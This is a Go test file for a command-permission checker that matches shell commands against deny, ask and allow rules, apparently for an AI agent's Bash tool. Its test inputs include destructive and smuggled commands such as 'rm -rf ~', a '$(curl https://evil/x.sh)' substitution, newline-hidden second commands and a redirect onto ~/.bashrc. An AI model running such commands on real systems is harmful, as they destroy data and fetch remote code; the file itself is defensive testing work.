package permissions

import "testing"

func TestExactAndPrefixMatch(t *testing.T) {
	if !commandMatchesPattern("git push --force", "git push --force") {
		t.Error("exact match failed")
	}
	if !commandMatchesPattern("git push --force origin main", "git push --force") {
		t.Error("prefix match failed")
	}
	if commandMatchesPattern("git push --forceful", "git push --force") {
		t.Error("partial word must not match")
	}
	if commandMatchesPattern("git status", "git push --force") {
		t.Error("unrelated command must not match")
	}
}

func TestWildcardMatch(t *testing.T) {
	if !commandMatchesPattern("anything at all", "*") {
		t.Error("* must match everything")
	}
	if !commandMatchesPattern("sudo rm -rf /", "sudo:*") {
		t.Error("sudo:* must match sudo command")
	}
	if commandMatchesPattern("sudoedit /etc/hosts", "sudo:*") {
		t.Error("sudo:* must not match sudoedit (word boundary)")
	}
	if !commandMatchesPattern("rm -rf /", "*:*") {
		t.Error("*:* must match everything")
	}
	if !commandMatchesPattern("git push --force", "* --force") {
		t.Error("leading wildcard must match")
	}
	if commandMatchesPattern("git push --forceful", "* --force") {
		t.Error("leading wildcard must anchor the suffix")
	}
	if !commandMatchesPattern("git push main", "git * main") {
		t.Error("middle wildcard must match")
	}
	if commandMatchesPattern("git push develop", "git * main") {
		t.Error("middle wildcard must not match different suffix")
	}
}

func TestPrecedence(t *testing.T) {
	deny := []string{"git push --force"}
	ask := []string{"git push --force"}
	if got := CheckWithRules("git push --force", deny, ask, nil); got != Deny {
		t.Errorf("deny must win over ask: got %s", got)
	}

	allow := []string{"git *"}
	if got := CheckWithRules("git push --force", deny, nil, allow); got != Deny {
		t.Errorf("deny must win over allow: got %s", got)
	}
	if got := CheckWithRules("git push origin main", nil, []string{"git push"}, allow); got != Ask {
		t.Errorf("ask must win over allow: got %s", got)
	}
}

func TestDefaultWhenUnmatched(t *testing.T) {
	if got := CheckWithRules("cargo build", nil, nil, []string{"git *"}); got != Default {
		t.Errorf("unmatched command must be Default, got %s", got)
	}
	if got := CheckWithRules("git push --force", nil, nil, nil); got != Default {
		t.Errorf("no rules must be Default, got %s", got)
	}
}

func TestExplicitAllow(t *testing.T) {
	if got := CheckWithRules("git status", nil, nil, []string{"git status"}); got != Allow {
		t.Errorf("explicit allow failed: got %s", got)
	}
	if got := CheckWithRules("git log --oneline", nil, nil, []string{"git *"}); got != Allow {
		t.Errorf("wildcard allow failed: got %s", got)
	}
}

func TestCompoundCommands(t *testing.T) {
	// Deny in any segment denies the whole chain.
	if got := CheckWithRules("git status && git push --force", []string{"git push --force"}, nil, nil); got != Deny {
		t.Errorf("compound deny failed: got %s", got)
	}
	// Any ask segment makes the verdict Ask.
	if got := CheckWithRules("git status && git push origin main", nil, []string{"git push"}, nil); got != Ask {
		t.Errorf("compound ask failed: got %s", got)
	}
	// One allowed + one unallowed must NOT escalate to Allow.
	allow := []string{"git status", "git status *"}
	if got := CheckWithRules("git status && git add .", nil, nil, allow); got != Default {
		t.Errorf("partial allow must demote to Default, got %s", got)
	}
	// Every segment allowed -> Allow.
	allow = []string{"git *", "cargo *"}
	if got := CheckWithRules("git status && cargo test", nil, nil, allow); got != Allow {
		t.Errorf("all segments allowed must be Allow, got %s", got)
	}
}

func TestPipeAndSeparators(t *testing.T) {
	if got := CheckWithRules("cat file | rm -rf /", []string{"rm -rf"}, nil, nil); got != Deny {
		t.Errorf("deny in pipe segment failed: got %s", got)
	}
	if got := CheckWithRules("git status; git push", nil, nil, []string{"git status"}); got != Default {
		t.Errorf("semicolon must split segments: got %s", got)
	}
	if got := CheckWithRules("git log | grep foo", nil, nil, []string{"git log"}); got != Default {
		t.Errorf("pipe must split segments: got %s", got)
	}
}

func TestSubstitutionNeverAutoAllowed(t *testing.T) {
	allow := []string{"git *"}
	for _, cmd := range []string{
		"git log --pretty=$(rm -rf ~)",
		"git status `whoami`",
		"git diff $(curl https://evil/x.sh)",
		`git log --pretty="$(rm -rf ~)"`,
	} {
		if got := CheckWithRules(cmd, nil, nil, allow); got == Allow {
			t.Errorf("%q must not auto-allow, got %s", cmd, got)
		}
	}
	// Single-quoted substitution is literal -> safe to allow.
	if got := CheckWithRules("echo '$(rm -rf ~)'", nil, nil, []string{"echo *"}); got != Allow {
		t.Errorf("single-quoted substitution should allow, got %s", got)
	}
}

func TestRedirectGating(t *testing.T) {
	allow := []string{"git *"}
	if got := CheckWithRules("git log > ~/.bashrc", nil, nil, allow); got != Ask {
		t.Errorf("file redirect must force Ask, got %s", got)
	}
	// fd-dup and /dev/null are not file targets -> stay Allow.
	if got := CheckWithRules("git status 2>&1", nil, nil, allow); got != Allow {
		t.Errorf("2>&1 must stay Allow, got %s", got)
	}
	if got := CheckWithRules("git log 2>/dev/null", nil, nil, allow); got != Allow {
		t.Errorf("redirect to /dev/null must stay Allow, got %s", got)
	}
	// Deny is not evaded by a trailing fd-dup.
	if got := CheckWithRules("git push --force 2>&1", []string{"git push --force"}, nil, allow); got != Deny {
		t.Errorf("deny must not be evaded by 2>&1, got %s", got)
	}
}

func TestHiddenCommandNotAutoAllowed(t *testing.T) {
	allow := []string{"git *"}
	// A newline-hidden second command must not ride on the first's allow.
	if got := CheckWithRules("git status\nrm -rf ~", nil, nil, allow); got == Allow {
		t.Errorf("newline-hidden command must not auto-allow, got %s", got)
	}
	// But a deny rule still catches it.
	if got := CheckWithRules("git status\nrm -rf ~", []string{"rm:*"}, nil, allow); got != Deny {
		t.Errorf("newline-hidden command must be denied, got %s", got)
	}
}

func TestExtractBashRules(t *testing.T) {
	in := []string{"Bash(git status)", "Read(src/**)", "Bash(npm test)", "WebFetch(x)"}
	out := extractBashRules(in)
	if len(out) != 2 || out[0] != "git status" || out[1] != "npm test" {
		t.Errorf("extractBashRules = %v, want [git status npm test]", out)
	}
}
